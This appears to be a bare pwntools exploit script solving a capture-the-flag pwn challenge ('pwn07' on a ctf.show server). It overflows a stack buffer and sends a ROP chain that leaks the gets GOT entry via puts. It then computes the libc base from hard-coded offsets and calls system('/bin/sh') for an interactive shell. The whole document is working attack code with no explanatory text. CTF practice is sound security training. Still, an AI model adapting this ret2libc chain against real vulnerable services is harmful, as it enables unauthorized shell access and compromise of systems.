# -*- coding: utf-8 -*-

import pwn
from pwn import *

fileName = './pwn07'
ip = 'pwn.challenge.ctf.show'
port = 28108

'''
[*] '/home/wkyuu/Desktop/pwn07'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
'''

p64 = pwn.p64
u64 = pwn.u64

context(log_level='debug', os='linux', arch = 'amd64')
p = process(fileName)
p = remote(ip, port)

def logger(msg, value=None, type='info'):  # type True for value
    if type == 'info':
        log.info(
            '================================ {} ================================\n'.format(msg))
    else:
        log.success('# {} => {}\n'.format(msg, value))

# bin
elf = ELF(fileName)
bin_func_main = elf.sym['main']
bin_puts_plt = elf.sym['puts']
bin_puts_got = elf.got['puts']
bin_gets_plt = elf.sym['gets']
bin_gets_got = elf.got['gets']
bin_pop_rdi_ret = 0x4006e3
bin_ret = 0x4006e4

# local libc
libc_gets_offset = 0x76f30
libc_puts_offset = 0x77820
libc_system_offset = 0x4c330
libc_str_bin_sh_offset = 0x196031

# remote libc
libc_gets_offset = 0x800b0
libc_puts_offset = 0x809c0
libc_system_offset = 0x4f440
libc_str_bin_sh_offset = 0x1b3e9a

gdbscript = '''
b *welcome+20
b *welcome+32
c
c
c
'''
# gdb.attach(p, gdbscript = gdbscript)

# leak_libc
logger('leak_libc')
payload = b'a' * (12 + 8) + p64(bin_pop_rdi_ret) + p64(bin_gets_got) + p64(bin_puts_plt) + p64(bin_func_main)
p.sendline(payload)
p.recvuntil(b'\x0a')

# leak_puts = int(p.recv(14), 16)
leak_gets = u64(p.recv(6).ljust(8, b'\x00'))
libc_base = leak_gets - libc_gets_offset
libc_system = libc_base + libc_system_offset
libc_str_bin_sh = libc_base + libc_str_bin_sh_offset

logger('leak_gets', hex(leak_gets), 'success')
logger('libc_base', hex(libc_base), 'success')
logger('libc_system', hex(libc_system), 'success')
logger('libc_str_bin_sh', hex(libc_str_bin_sh), 'success')

# rop
logger('rop')
payload = b'a' * (12 + 8) + p64(bin_ret) + p64(bin_pop_rdi_ret) + p64(libc_str_bin_sh) + p64(libc_system)
p.sendline(payload)
p.interactive()
